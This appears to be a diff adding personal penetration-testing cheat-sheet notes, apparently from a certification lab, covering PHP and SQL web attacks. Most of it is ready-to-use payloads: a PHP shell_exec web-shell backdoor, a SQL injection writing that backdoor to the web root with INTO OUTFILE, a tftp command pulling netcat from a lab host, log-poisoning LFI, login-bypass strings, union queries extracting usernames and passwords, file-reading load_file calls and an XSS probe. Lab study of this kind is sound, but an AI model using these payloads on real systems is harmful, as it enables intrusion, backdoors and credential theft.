@@ -1,0 +1,64 @@
+PHP Null Byte - eg to terminate a URL string #
+
+Below PHP5.3 it is: %00 
+
+Gobuster syntax gobuster -u <URL> \
+-s <error codes> (try 204,301,302,307,403,500,200)
+-w /usr/share/seclist etc etc
+
+RFI / LFI - php.ini location is apache/bin
+If php.ini is set to prevent remote files (ftp / http) then RFI is difficult.  The parameters are called allow_url_fopen and allow_url_include
+
+Quick php backdoor via contaminating log files on XAMMP or OUTFILE in SQL
+<?php echo shell_exec($_GET['cmd=XYZ']);?> (note you don't need "" around your command eg <URL>cmd=tftp%20-i%2010.11.0.62%20GET%20nc.exe will work fine. 
+
+Guestbook SQL abuse via POST (check the bold bits!)
+<rest of URL><vuln field>'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor2.php';#
+
+Davtest and Cadaver are useful for WebDAV - especially with the -MOVE and -nocreate switches in Davtest.
+
+Hash-identifier or OpenWall Sample Hashes can help ID any hash types - then specify this in JtR or similar.
+
+Checking for LFI  - change to /etc/passwd / any OS variances etc 
+http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=<insert command here>../../../../../
+../../xampp/apache/logs/access.log%00
+or
+<?php echo shell_exec(ipconfig);?>  Can replace with tftp -i command to grab netcat etc
+
+PHP Error Reporting
+Insert error_reporting(0) or (1) in the particular PHP script.
+
+Attacking Wordpress - a good start point
+https://hackertarget.com/attacking-wordpress/
+
+.HTACCESS Cracking - use medusa (pg276)
+
+SQL INJECTION
+
+;# to terminate SQL input
+- to mark the syntax that follows as comment
+
+-sleep(5) will help see if the input is affecting the database as webapp will probably hang for 5 seconds.
+
+<wronguser>' or 1=1;# will bypass the auth (pg247)
+<wronguser>' or 1=1 LIMIT 1;# will bypass if the login code is set as <number of rows = 1> (pg247)
+
+Order by
+order by 1,2,3,4,5,6,7,8,9,10 etc.  If says not found on 7 then you know there are 6 columns.
+
+Common Union Selects
+@@version, user()
+
+Grab info schema
+<URL> union%20select%20all%201,2,3,4,table_name,6%20FROM%20information_schema.tables (1,2,3,4 etc needs matching to environment)
+
+Grabbing creds
+<URL>id=738%20union%20select%20all%201,2,3,4,concat%28name,0x3a,password%29,%206%20from%20users Note that the 'table selection' variable (in this case FROM users) needs to go at the end, experimented with putting after the concat and it wouldn't work even using exit symbols.
+
+Load_file
+load_file("C:/windows/system32/drivers/etc/hosts") Note the forward (not rear) slashes. Could read proof.txt!
+
+Quick XSS Check
+<script>alert("TESTING")</script>
+
+
